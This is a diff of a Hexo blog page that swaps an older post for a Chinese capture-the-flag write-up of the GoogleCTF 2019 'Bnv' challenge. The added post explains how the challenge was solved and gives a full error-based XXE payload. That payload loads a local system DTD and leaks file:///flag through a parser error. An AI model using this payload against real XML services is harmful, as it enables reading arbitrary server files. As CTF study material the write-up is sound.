@@ -13,7 +13,7 @@
 
 
 
-<title>2020]Hurdles | Hexo</title>
+<title>Quals]Bnv | Hexo</title>
 
 
 
@@ -196,7 +196,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">2020]Hurdles</h1>
+            <h1 class="post-title">Quals]Bnv</h1>
             
                 <div class="post-meta">
                     
@@ -205,7 +205,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">September 9, 2024&nbsp;&nbsp;20:59:35</a>
+                        Date: <a href="#">September 18, 2024&nbsp;&nbsp;21:44:01</a>
                         </span>
                     
                     
@@ -221,11 +221,30 @@
         </header>
 
         <div class="post-content">
-            <h2 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h2><p><img src="/../images/%5BBSidesCF2020%5DHurdles/1.png" alt="1"></p>
-<p><img src="/../images/%5BBSidesCF2020%5DHurdles/2.png" alt="2"></p>
-<p>HTTP 请求中的Header 参数:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_15071263/article/details/81000313?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task">https://blog.csdn.net/qq_15071263/article/details/81000313?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p>
-<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/112298411">https://blog.csdn.net/weixin_44037296/article/details/112298411</a></p>
-<h3 id="注意：开始传参的时候记得加引号"><a href="#注意：开始传参的时候记得加引号" class="headerlink" title="注意：开始传参的时候记得加引号"></a>注意：开始传参的时候记得加引号</h3>
+            <h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p>先bp抓包发现</p>
+<p><img src="/../images/%5BGoogleCTF2019Quals%5DBnv/1.png" alt="1"></p>
+<p>是json数据：由json数据想到是xxe注入，再次基础上修改Content-Type为application&#x2F;xml,发现是少了一个&lt;，感觉是少了一个xml文件的头，加一个</p>
+<p><img src="/../images/%5BGoogleCTF2019Quals%5DBnv/2.png" alt="2"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%5BGoogleCTF2019Quals%5DBnv/3.png" alt="3"></p>
+<p>报错说是没找到DTD文件，添加DTD文件的实体</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&quot;135601360123502401401250&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%5BGoogleCTF2019Quals%5DBnv/4.png" alt="4"></p>
+<p>报错没有元素消息的声明</p>
+<p><img src="/../images/%5BGoogleCTF2019Quals%5DBnv/5.png" alt="5"></p>
+<p>可以看到报错没有元素消息的声明，显然解析器需要在DTD中声明以定义的元素，有点像在使用变量之前声明变量。所以让我们给它想要的，我们要做的就是在DTD中声明消息，我们可以通过使用数据，指定名为message的元素来实现这一点，定义类型设置为PC数据，现在让我们继续尝试。</p>
+<p>这里得说一下DTD<br>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。带有DTD的XML文档实例<br><img src="/../images/%5BGoogleCTF2019Quals%5DBnv/6.png" alt="6"></p>
+<p>回显成功，通过外带数据的形式添加一<img src="/../images/%5BGoogleCTF2019Quals%5DBnv/7.png" alt="7">个外部实体来发出出口请求。</p>
+<p>未加载外部实体，需要使用内部dtd文件加载，（之前还用加载文件的方法，结果标记错误）<img src="/../images/%5BGoogleCTF2019Quals%5DBnv/8.png" alt="8"></p>
+<p><img src="/../images/%5BGoogleCTF2019Quals%5DBnv/10.png" alt="10"></p>
+<p>最后的数据：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">local_dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">ISOamso</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%5BGoogleCTF2019Quals%5DBnv/9.png" alt="9"></p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/cjdgg/article/details/114420160">https://blog.csdn.net/cjdgg/article/details/114420160</a></p>
+
         </div>
 
         
@@ -239,7 +258,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://odiws.github.io/2024/09/09/2020-Hurdles/">http://odiws.github.io/2024/09/09/2020-Hurdles/</a></span>
+                        <span><a href="http://odiws.github.io/2024/09/18/Quals-Bnv/">http://odiws.github.io/2024/09/18/Quals-Bnv/</a></span>
                     </p>
                 
                 
@@ -265,7 +284,7 @@
                     
                         <a href="/tags/buuctf/"># buuctf</a>
                     
-                        <a href="/tags/http/"># http</a>
+                        <a href="/tags/xxe/"># xxe</a>
                     
                         
                 </span>
@@ -278,10 +297,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2024/09/10/%E5%85%A5%E7%BE%A4%E9%A2%98-Web/">入群题]Web</a>
             
-            
-            <a class="next" rel="next" href="/2024/09/08/HFCTF2020-BabyUpload/">[HFCTF2020]BabyUpload</a>
+            <a class="next" rel="next" href="/2024/09/10/%E5%85%A5%E7%BE%A4%E9%A2%98-Web/">入群题]Web</a>
             
         </section>
 
